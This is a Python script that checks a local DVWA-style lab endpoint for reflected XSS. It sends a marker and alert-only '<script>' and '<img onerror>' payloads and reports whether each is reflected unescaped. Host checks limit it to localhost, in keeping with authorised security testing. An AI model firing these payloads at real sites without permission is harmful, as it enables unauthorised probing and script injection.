#!/usr/bin/env python3
# XSS-003 reflected XSS local verification draft (Python 3 stdlib only).
# Scope: local authorized lab only. Never commit cookies or tokens.
import argparse
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
PLAIN_MARKER = "XSS003_PLAIN_MARKER"
SCRIPT_PAYLOAD = "<script>alert('XSS003')</script>"
BENIGN_PAYLOAD = "<img src=x onerror=alert('XSS003')>"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code, "redirect blocked: " + newurl, headers, fp)


def check_base(base):
    parts = urllib.parse.urlsplit(base)
    if parts.scheme not in ("http", "https"):
        sys.exit("unsupported scheme: %s" % parts.scheme)
    if (parts.hostname or "") not in ALLOWED_HOSTS:
        sys.exit("host not allowed: %s" % (parts.hostname or ""))
    return base.rstrip("/")


def get(opener, url, cookie, timeout):
    req = urllib.request.Request(url, headers={"User-Agent": "xss003-local-check"})
    if cookie:
        req.add_header("Cookie", cookie)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "replace"), resp.geturl()
    except urllib.error.HTTPError as exc:
        return exc.code, (exc.read() or b"").decode("utf-8", "replace"), url
    except urllib.error.URLError as exc:
        sys.exit("connection/protocol error: %s" % exc)


def main():
    ap = argparse.ArgumentParser(description="Local reflected XSS check for XSS-003")
    ap.add_argument("--base", required=True, help="lab base URL, e.g. http://127.0.0.1/dvwa")
    ap.add_argument("--path", default="/vulnerabilities/xss_r/", help="endpoint path")
    ap.add_argument("--cookie", default="", help="session cookie; read from local env/file, never commit")
    ap.add_argument("--param", default="name", help="GET parameter name")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--payload", action="append", default=None, help="override payload; repeatable")
    args = ap.parse_args()

    base = check_base(args.base)
    opener = urllib.request.build_opener(NoRedirect)
    payloads = args.payload or [PLAIN_MARKER, SCRIPT_PAYLOAD, BENIGN_PAYLOAD]

    for payload in payloads:
        url = base + args.path + "?" + urllib.parse.urlencode({args.param: payload})
        status, body, final_url = get(opener, url, args.cookie, args.timeout)
        greeting = re.search(r"<pre>Hello (.*?)</pre>", body, re.S)
        print("payload=%r" % payload)
        print("status=%s final_url=%s" % (status, final_url))
        print("reflected_raw=%s" % (payload in body))
        print("lt_present=%s script_tag_present=%s img_tag_present=%s" % (
            "<" in body, "<script" in body, "<img" in body))
        print("greeting=%r" % (greeting.group(1)[:200] if greeting else None))
        print("-" * 60)


if __name__ == "__main__":
    main()
